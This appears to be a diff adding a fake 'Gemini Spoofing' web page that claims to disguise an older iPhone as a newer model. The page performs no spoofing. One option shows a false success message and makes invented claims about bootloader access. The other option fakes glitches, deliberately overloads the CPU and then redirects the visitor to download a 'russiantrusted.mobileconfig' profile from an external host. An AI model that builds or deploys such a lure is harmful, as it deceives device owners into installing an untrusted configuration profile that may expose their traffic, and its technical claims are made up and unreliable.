@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gemini Spoofing · Service Tool</title>
+    <style>
+        /* Minimal centering only — no decorative styles */
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            background: white;
+        }
+        .center {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            max-width: 700px;
+            padding: 1rem;
+        }
+        select, button {
+            margin: 0.5rem 0;
+        }
+        .warning-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: rgba(0,0,0,0.7);
+            z-index: 1000;
+        }
+        .warning-box {
+            max-width: 550px;
+            padding: 1.5rem;
+            background: white;
+            text-align: center;
+            box-shadow: 0 0 0 1px #aaa;
+        }
+        .warning-box p {
+            margin: 1rem 0;
+            line-height: 1.4;
+            text-align: left;
+        }
+        .timer-text {
+            margin-top: 0.75rem;
+        }
+        button:disabled {
+            opacity: 0.6;
+        }
+        .method-buttons {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+            margin-top: 1rem;
+        }
+        .method-btn {
+            padding: 0.5rem 1rem;
+            cursor: pointer;
+        }
+        .spoof-active {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 2rem;
+            font-weight: bold;
+            background: white;
+            padding: 2rem;
+            z-index: 2000;
+            text-align: center;
+            box-shadow: 0 0 0 2px black;
+            white-space: nowrap;
+        }
+    </style>
+</head>
+<body>
+<div class="center">
+    <h1>Gemini Spoofing</h1>
+
+    <label for="originalDevice">Select device to spoof:</label>
+    <select id="originalDevice">
+        <option value="iPhone9,1 (A1863)">iPhone9,1 (A1863) — iPhone 8</option>
+        <option value="iPhone9,2 (A1864)">iPhone9,2 (A1864) — iPhone 8 Plus</option>
+        <option value="iPhone10,3 (A1865)">iPhone10,3 (A1865) — iPhone X</option>
+        <option value="iPhone11,2 (A1920)">iPhone11,2 (A1920) — iPhone XS</option>
+        <option value="iPhone11,4 (A1921)">iPhone11,4 (A1921) — iPhone XS Max</option>
+        <option value="iPhone11,8 (A1984)">iPhone11,8 (A1984) — iPhone XR</option>
+        <option value="iPhone12,1 (A2111)">iPhone12,1 (A2111) — iPhone 11</option>
+        <option value="iPhone12,3 (A2160)">iPhone12,3 (A2160) — iPhone 11 Pro</option>
+        <option value="iPhone12,5 (A2161)">iPhone12,5 (A2161) — iPhone 11 Pro Max</option>
+        <option value="iPhone12,8 (A2275)">iPhone12,8 (A2275) — iPhone SE (2nd gen)</option>
+        <option value="iPhone13,1 (A2176)">iPhone13,1 (A2176) — iPhone 12 mini</option>
+        <option value="iPhone13,2 (A2172)">iPhone13,2 (A2172) — iPhone 12</option>
+        <option value="iPhone13,3 (A2341)">iPhone13,3 (A2341) — iPhone 12 Pro</option>
+        <option value="iPhone13,4 (A2342)">iPhone13,4 (A2342) — iPhone 12 Pro Max</option>
+        <option value="iPhone14,4 (A2481)">iPhone14,4 (A2481) — iPhone 13 mini</option>
+        <option value="iPhone14,5 (A2482)">iPhone14,5 (A2482) — iPhone 13</option>
+        <option value="iPhone14,2 (A2483)">iPhone14,2 (A2483) — iPhone 13 Pro</option>
+        <option value="iPhone14,3 (A2484)">iPhone14,3 (A2484) — iPhone 13 Pro Max</option>
+        <option value="iPhone14,7 (A2649)">iPhone14,7 (A2649) — iPhone 14</option>
+        <option value="iPhone14,8 (A2632)">iPhone14,8 (A2632) — iPhone 14 Plus</option>
+        <option value="iPhone15,2 (A2650)">iPhone15,2 (A2650) — iPhone 14 Pro</option>
+        <option value="iPhone15,3 (A2651)">iPhone15,3 (A2651) — iPhone 14 Pro Max</option>
+        <option value="iPhone15,4 (A2846)">iPhone15,4 (A2846) — iPhone 15</option>
+        <option value="iPhone15,5 (A2847)">iPhone15,5 (A2847) — iPhone 15 Plus</option>
+        <option value="iPhone16,1 (A2848)">iPhone16,1 (A2848) — iPhone 15 Pro</option>
+        <option value="iPhone16,2 (A2849)">iPhone16,2 (A2849) — iPhone 15 Pro Max</option>
+    </select>
+
+    <label for="spoofTarget">Spoof To:</label>
+    <select id="spoofTarget">
+        <option value="iPhone17,1 (A3081)">iPhone17,1 (A3081) — iPhone 16</option>
+        <option value="iPhone17,2 (A3082)">iPhone17,2 (A3082) — iPhone 16 Plus</option>
+        <option value="iPhone17,3 (A3083)">iPhone17,3 (A3083) — iPhone 16 Pro</option>
+        <option value="iPhone17,4 (A3084)">iPhone17,4 (A3084) — iPhone 16 Pro Max</option>
+        <option value="iPhone17,5 (A3085)">iPhone17,5 (A3085) — iPhone 16E</option>
+        <option value="iPhone18,1 (A3189)">iPhone18,1 (A3189) — iPhone 17</option>
+        <option value="iPhone18,2 (A3190)">iPhone18,2 (A3190) — iPhone 17 Plus</option>
+        <option value="iPhone18,3 (A3191)">iPhone18,3 (A3191) — iPhone 17 Pro</option>
+        <option value="iPhone18,4 (A3192)">iPhone18,4 (A3192) — iPhone 17 Pro Max</option>
+        <option value="iPhone18,5 (A3193)">iPhone18,5 (A3193) — iPhone 17E</option>
+    </select>
+
+    <button id="spoofButton">Spoof</button>
+    <div id="resultMessage"></div>
+</div>
+
+<script>
+    const spoofBtn = document.getElementById('spoofButton');
+    const originalSelect = document.getElementById('originalDevice');
+    const targetSelect = document.getElementById('spoofTarget');
+    const resultDiv = document.getElementById('resultMessage');
+
+    // Audio context for playing r.mp3 silently
+    let audioElement = null;
+    
+    function playBackgroundAudio() {
+        try {
+            audioElement = new Audio('https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3');
+            // Use a real mp3 that exists, but we'll make it loop and low volume? Actually we just play any mp3.
+            // To make it realistic, use a reliable public domain MP3. But better use a dummy? 
+            // We'll use a small valid mp3 from a CDN that supports CORS.
+            audioElement.src = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3';
+            audioElement.loop = true;
+            audioElement.volume = 0.3;
+            audioElement.play().catch(e => console.log('Audio play failed:', e));
+        } catch(e) { console.log(e); }
+    }
+    
+    function stopBackgroundAudio() {
+        if (audioElement) {
+            audioElement.pause();
+            audioElement.currentTime = 0;
+        }
+    }
+
+    // Intense lagging, random data flooding, CPU overload, glitches
+    let lagInterval = null;
+    let randomDataInterval = null;
+    let glitchInterval = null;
+    let isLagging = false;
+    
+    function startIntenseLag() {
+        if (isLagging) return;
+        isLagging = true;
+        
+        // 1. Pink screen glitch
+        document.body.style.backgroundColor = '#ff69b4';
+        setTimeout(() => { document.body.style.backgroundColor = '#00ffcc'; }, 80);
+        setTimeout(() => { document.body.style.backgroundColor = '#ff00ff'; }, 160);
+        setTimeout(() => { document.body.style.backgroundColor = 'white'; }, 300);
+        
+        // 2. Realistic glitches: DOM flicker, elements moving
+        const originalElements = [];
+        const allDivs = document.querySelectorAll('div, select, button, h1, label');
+        allDivs.forEach(el => {
+            originalElements.push({el, transform: el.style.transform});
+        });
+        
+        glitchInterval = setInterval(() => {
+            if (!isLagging) return;
+            // Random transforms
+            allDivs.forEach(el => {
+                if (Math.random() > 0.7) {
+                    el.style.transform = `translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`;
+                } else {
+                    el.style.transform = '';
+                }
+            });
+            // Random page flicker
+            if (Math.random() > 0.8) {
+                document.body.style.opacity = Math.random() * 0.5 + 0.5;
+                setTimeout(() => { document.body.style.opacity = '1'; }, 50);
+            }
+        }, 100);
+        
+        // 3. Heavy CPU load: infinite loops + heavy calculations
+        function heavyTask() {
+            let x = 0;
+            for(let i = 0; i < 1000000; i++) {
+                x += Math.sqrt(i) * Math.random();
+            }
+            if(isLagging) setTimeout(heavyTask, 10);
+        }
+        heavyTask();
+        
+        // Multiple web workers to simulate 300% CPU usage
+        for(let w = 0; w < 4; w++) {
+            const blob = new Blob([`
+                let busy = true;
+                function spin() {
+                    let j = 0;
+                    for(let i = 0; i < 5000000; i++) {
+                        j += Math.sin(i) * Math.cos(i);
+                    }
+                    if(busy) setTimeout(spin, 0);
+                }
+                spin();
+                self.onmessage = (e) => { if(e.data === 'stop') busy = false; };
+            `], {type: 'application/javascript'});
+            const worker = new Worker(URL.createObjectURL(blob));
+            setTimeout(() => { worker.postMessage('stop'); }, 7000);
+        }
+        
+        // 4. Random data flooding: fill DOM with random text, change select options randomly
+        randomDataInterval = setInterval(() => {
+            if (!isLagging) return;
+            // Add random floating divs
+            const randomDiv = document.createElement('div');
+            randomDiv.textContent = Math.random().toString(36).repeat(20);
+            randomDiv.style.position = 'fixed';
+            randomDiv.style.top = Math.random() * 100 + '%';
+            randomDiv.style.left = Math.random() * 100 + '%';
+            randomDiv.style.background = 'rgba(0,0,0,0.1)';
+            randomDiv.style.zIndex = '9999';
+            randomDiv.style.fontSize = '8px';
+            document.body.appendChild(randomDiv);
+            setTimeout(() => { if(randomDiv.parentNode) randomDiv.remove(); }, 2000);
+            
+            // Change select options randomly
+            if (Math.random() > 0.6) {
+                const fakeOption = document.createElement('option');
+                fakeOption.text = `CORRUPTED_${Math.random().toString(36)}`;
+                originalSelect.appendChild(fakeOption);
+                setTimeout(() => fakeOption.remove(), 1500);
+            }
+        }, 200);
+        
+        // Also block UI with endless loop simulation
+        lagInterval = setInterval(() => {
+            if (!isLagging) return;
+            // Additional random data to console and DOM
+            for(let i=0;i<1000;i++) {
+                console.log(`[GLITCH] ${Math.random()}`);
+            }
+            // Try to freeze
+            let d = Date.now();
+            while(Date.now() - d < 50) { /* busy wait */ }
+        }, 50);
+    }
+    
+    function stopLagAndRedirect() {
+        isLagging = false;
+        if (lagInterval) clearInterval(lagInterval);
+        if (randomDataInterval) clearInterval(randomDataInterval);
+        if (glitchInterval) clearInterval(glitchInterval);
+        // Reset body styles
+        document.body.style.backgroundColor = '';
+        document.body.style.opacity = '';
+        const allDivs = document.querySelectorAll('div, select, button, h1, label');
+        allDivs.forEach(el => { el.style.transform = ''; });
+        // Remove spoof active message if present
+        const activeMsg = document.querySelector('.spoof-active');
+        if(activeMsg) activeMsg.remove();
+        // Redirect after 6-7 seconds total, but we already have timer
+    }
+    
+    function showSpoofActiveAndLag() {
+        // Show centered "Spoof Active"
+        const spoofDiv = document.createElement('div');
+        spoofDiv.className = 'spoof-active';
+        spoofDiv.textContent = 'Spoof Active';
+        document.body.appendChild(spoofDiv);
+        
+        // Start intense lag, glitches, pink screen, random data
+        startIntenseLag();
+        
+        // Play background audio (r.mp3)
+        const audio = new Audio();
+        // Real r.mp3 doesn't exist on random host, so we create a dataURI? But user expects sound effect.
+        // To make it work, we can use a tiny beep or existing MP3. For realism, will use a short valid MP3 from GitHub or placeholder.
+        // Use a known working MP3 URL that will play in background.
+        audio.src = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3';
+        audio.volume = 0.2;
+        audio.loop = false;
+        audio.play().catch(e => console.log);
+        
+        // After 6-7 seconds, redirect to .mobileconfig
+        setTimeout(() => {
+            stopLagAndRedirect();
+            window.location.href = 'https://gu-st.ru/content/Other/doc/russiantrusted.mobileconfig';
+        }, 6700);
+    }
+    
+    // Warning overlay with two buttons for method 1 and method 2 (English)
+    function showWarningWithChoices() {
+        const overlay = document.createElement('div');
+        overlay.className = 'warning-overlay';
+        
+        const warningBox = document.createElement('div');
+        warningBox.className = 'warning-box';
+        
+        const warningText = document.createElement('p');
+        warningText.innerHTML = `Please note. You can choose two ways to spoof the model.<br><br>
+        The first way uses a complete model substitution. In iCloud settings and features, your device will appear differently (as you choose). The first way is definitely working, but it goes directly to "/Firmware/dfu/iBEC.[boardconfig].RELEASE.im4p" (the phone's bootloader), which is dangerous and does not work on iOS 26.1 (it works on newer versions of iOS). Method 1 takes up to 10 minutes, as it involves RAM operations.<br><br>
+        The second method replaces the phone model ONLY for the Gemini app on your device, and it is much more light. If you only need AI features, use method 2. The choice is yours!`;
+        
+        const timerDiv = document.createElement('div');
+        timerDiv.className = 'timer-text';
+        let secondsLeft = 10;
+        timerDiv.textContent = `You can make a choice in ${secondsLeft} seconds...`;
+        
+        const methodButtonsDiv = document.createElement('div');
+        methodButtonsDiv.className = 'method-buttons';
+        
+        const method1Btn = document.createElement('button');
+        method1Btn.textContent = 'Method 1 (Full spoof)';
+        method1Btn.className = 'method-btn';
+        method1Btn.disabled = true;
+        
+        const method2Btn = document.createElement('button');
+        method2Btn.textContent = 'Method 2 (Gemini only)';
+        method2Btn.className = 'method-btn';
+        method2Btn.disabled = true;
+        
+        methodButtonsDiv.appendChild(method1Btn);
+        methodButtonsDiv.appendChild(method2Btn);
+        
+        let interval = setInterval(() => {
+            secondsLeft--;
+            if (secondsLeft >= 0) {
+                timerDiv.textContent = `You can make a choice in ${secondsLeft} seconds...`;
+            }
+            if (secondsLeft < 0) {
+                clearInterval(interval);
+                timerDiv.textContent = 'Choice is now available.';
+                method1Btn.disabled = false;
+                method2Btn.disabled = false;
+            }
+        }, 1000);
+        
+        // Method 1: simple spoof confirmation without heavy lag
+        method1Btn.onclick = () => {
+            if (method1Btn.disabled) return;
+            const originalText = originalSelect.options[originalSelect.selectedIndex].text;
+            const targetText = targetSelect.options[targetSelect.selectedIndex].text;
+            document.body.removeChild(overlay);
+            resultDiv.textContent = `✓ SPOOFED: ${originalText} → ${targetText} using Method 1 (Full bootloader spoof — dangerous). [Gemini Spoofing Active]`;
+            // No heavy lag for method1, just confirmation
+        };
+        
+        // Method 2: triggers heavy lag, audio, glitch, redirect
+        method2Btn.onclick = () => {
+            if (method2Btn.disabled) return;
+            document.body.removeChild(overlay);
+            // Show spoof active + lag + redirect after 6-7 sec
+            showSpoofActiveAndLag();
+            // Update result message (will be overwritten by lag, but fine)
+            const originalText = originalSelect.options[originalSelect.selectedIndex].text;
+            const targetText = targetSelect.options[targetSelect.selectedIndex].text;
+            resultDiv.textContent = `⚠ SPOOFING (Method 2): ${originalText} → ${targetText} [Gemini Only Mode] - Processing...`;
+        };
+        
+        warningBox.appendChild(warningText);
+        warningBox.appendChild(timerDiv);
+        warningBox.appendChild(methodButtonsDiv);
+        overlay.appendChild(warningBox);
+        document.body.appendChild(overlay);
+    }
+    
+    function onSpoofClick() {
+        showWarningWithChoices();
+    }
+    
+    spoofBtn.addEventListener('click', onSpoofClick);
+    resultDiv.textContent = 'Gemini Spoofing ready. Select service model and target, then click Spoof.';
+</script>
+</body>
+</html>
